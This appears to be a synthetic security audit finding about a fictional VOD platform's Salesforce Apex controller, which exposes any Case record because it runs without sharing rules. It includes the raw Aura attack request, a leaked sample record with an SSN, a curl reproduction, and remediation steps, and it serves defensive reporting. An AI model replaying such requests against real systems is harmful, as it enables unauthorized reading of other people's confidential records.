# Security Analysis Report
**System:** StreamCore VOD Platform (Salesforce-Integrated)
**Domain:** Media / Video-On-Demand
**Example ID:** SF-0069
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.2 | SOQL record-level access bypass on `CaseController.getCaseDetails` — attacker reads any VOD Case record |

---

## Finding 1 — Platform: SOQL Record-Level Access Bypass on Case Object (Pattern 9.2)

### Summary
The Apex controller `CaseController` on StreamCore VOD Platform (`e93d0ebf.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Case object. Per §5.0 Pattern 9.2, the SOQL query interpolates `caseId` directly from client input without `WITH SECURITY_ENFORCED` or an ownership predicate, bypassing Salesforce record-level access controls.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.CaseController.getCaseDetails`
**Affected endpoint:** `POST https://e93d0ebf.lightning.force.com/aura`
**Note:** Apex method name and Aura descriptor both use `getCaseDetails` — consistent within context.txt.

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://e93d0ebf.lightning.force.com/aura
Authorization: Bearer 00DE93D0EBF!ARe93d0ebf...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DE93D0EBF!ARe93d0ebf...

message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN",
"params":{"caseId":"0010EBF","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Case Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0010EBF", "Name": "Victim Case Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-24-3713"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DE93D0EBF!ARe93d0ebf..."
curl -s -X POST "https://e93d0ebf.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN","params":{"caseId":"0010EBF","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-24-3713
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CaseController { ... }`
2. Add `WITH SECURITY_ENFORCED` to all SOQL queries.
3. `WHERE Id = :caseId AND OwnerId = :UserInfo.getUserId()`
4. Server-side `fields` allowlist. Validate `aura.token`.
